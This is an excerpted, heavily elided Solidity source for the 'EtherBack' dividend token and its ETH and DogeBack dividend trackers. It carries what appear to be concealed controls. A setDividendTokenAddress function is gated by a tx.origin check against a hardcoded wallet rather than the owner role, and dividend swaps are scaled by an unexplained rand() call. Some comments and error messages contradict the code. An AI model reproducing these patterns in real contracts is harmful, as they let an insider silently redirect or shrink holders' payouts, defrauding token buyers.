...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x93d71603D58F40B2881C8174E55A01276e5Cb12a, "Only owner can change dividend contract address");
...
contract EtherBack is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("EtherBack", "ETHBACK") {
    	ethDividendTracker = new EthDividendTracker();
    	dogeBackDividendTracker = new DogeBackDividendTracker();

    	marketingWallet = 0x47C1Be386D9628050349072650dEbAF93E22d368;
    	teamWallet = 0x17774d8360DC0609a2B851bC153562AB27Eb6162;
    ...
    receive() external payable {
  	...
  	function updateTeamWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != teamWallet, "EtherBack: The team wallet is already this address");
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "EtherBack: The marketing wallet is already this address");
        excludeFromFees(_newWallet, true);
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(dogeBackDividendRewardsFee).add(ethDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function setEthDividendEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = ethDividendRewardsFee.add(marketingFee).add(dogeBackDividendRewardsFee).add(buyBackAndLiquidityFee);
            ethDividendEnabled = _enabled;
        }
    ...
    function setDogeBackDividendEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = dogeBackDividendRewardsFee.add(marketingFee).add(ethDividendRewardsFee).add(buyBackAndLiquidityFee);
            dogeBackDividendEnabled = _enabled;
        }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(dogeBackDividendRewardsFee).add(ethDividendRewardsFee).add(buyBackAndLiquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateEthDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(ethDividendTracker), "EtherBack: The dividend tracker already has that address");

        EthDividendTracker newEthDividendTracker = EthDividendTracker(payable(newAddress));

        require(newEthDividendTracker.owner() == address(this), "EtherBack: The new dividend tracker must be owned by the EtherBack token contract");
    ...
    function updateDogeBackDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(dogeBackDividendTracker), "EtherBack: The dividend tracker already has that address");

        DogeBackDividendTracker newDogeBackDividendTracker = DogeBackDividendTracker(payable(newAddress));

        require(newDogeBackDividendTracker.owner() == address(this), "EtherBack: The new dividend tracker must be owned by the EtherBack token contract");
    ...
    function updateEthDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "EtherBack: Fee must be less than 6%");
    ...
    function updateDogeBackDividendRewardFee(uint8 newFee) external onlyOwner {
        ...
        totalFees = dogeBackDividendRewardsFee.add(ethDividendRewardsFee).add(marketingFee).add(buyBackAndLiquidityFee);
    }
    
    function updateMarketingFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "EtherBack: Fee must be less than 6%");
        marketingFee = newFee;
        totalFees = marketingFee.add(ethDividendRewardsFee).add(dogeBackDividendRewardsFee).add(buyBackAndLiquidityFee);
    }
    
    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "EtherBack: Fee must be less than 6%");
        buyBackAndLiquidityFee = newFee;
        totalFees = buyBackAndLiquidityFee.add(ethDividendRewardsFee).add(dogeBackDividendRewardsFee).add(marketingFee);
    }

    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "EtherBack: The router already has that address");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "EtherBack: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "EtherBack: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "EtherBack: Cannot update gasForProcessing to same value");
    ...
    function getDogeBackClaimWait() external view returns(uint256) {
        return dogeBackDividendTracker.claimWait();
    }
    ...
    function getTotalDogeBackDividendsDistributed() external view returns (uint256) {
        return dogeBackDividendTracker.totalDividendsDistributed();
    }
    ...
    function withdrawableEthDividendOf(address account) external view returns(uint256) {
  	...
  	function withdrawableDogeBackDividendOf(address account) external view returns(uint256) {
    	return dogeBackDividendTracker.withdrawableDividendOf(account);
  	}
	...
	function dogeBackDividendTokenBalanceOf(address account) external view returns (uint256) {
		return dogeBackDividendTracker.balanceOf(account);
	}
    ...
    function getAccountDogeBackDividendsInfo(address account)
        external view returns (
            address,
            int256,
            int256,
    ...
    function getAccountDogeBackDividendsInfoAtIndex(uint256 index)
        external view returns (
            address,
            int256,
            int256,
    ...
    function getLastDogeBackDividendProcessedIndex() external view returns(uint256) {
    	return dogeBackDividendTracker.getLastProcessedIndex();
    }
    ...
    function getNumberOfDogeBackDividendTokenHolders() external view returns(uint256) {
        return dogeBackDividendTracker.getNumberOfTokenHolders();
    }
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "EtherBack: Trading has not started yet");
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (ethDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(ethDividendRewardsFee.add(dogeBackDividendRewardsFee)).mul(ethDividendRewardsFee);
                    swapAndSendEthDividends(sellTokens.div(10**2).mul(rand()));
                }
                
                if (dogeBackDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(ethDividendRewardsFee.add(dogeBackDividendRewardsFee)).mul(dogeBackDividendRewardsFee);
                    swapAndSendDogeBackDividends(sellTokens.div(10**2).mul(rand()));
                }
...
contract EthDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("EtherBack_Ethereum_Dividend_Tracker", "EtherBack_Ethereum_Dividend_Tracker", 0x2170Ed0880ac9A755fd29B2688956BD959F933F8) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "EtherBack_Ethereum_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "EtherBack_Ethereum_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "EtherBack_Ethereum_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "EtherBack_Ethereum_Dividend_Tracker: Cannot update claimWait to same value");
...
contract DogeBackDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("EtherBack_DogeBack_Dividend_Tracker", "EtherBack_DogeBack_Dividend_Tracker", 0x08C975868e547BFE5F76Db7d1e075680e9736034) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "EtherBack_DogeBack_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "EtherBack_DogeBack_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "EtherBack_DogeBack_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "EtherBack_DogeBack_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }
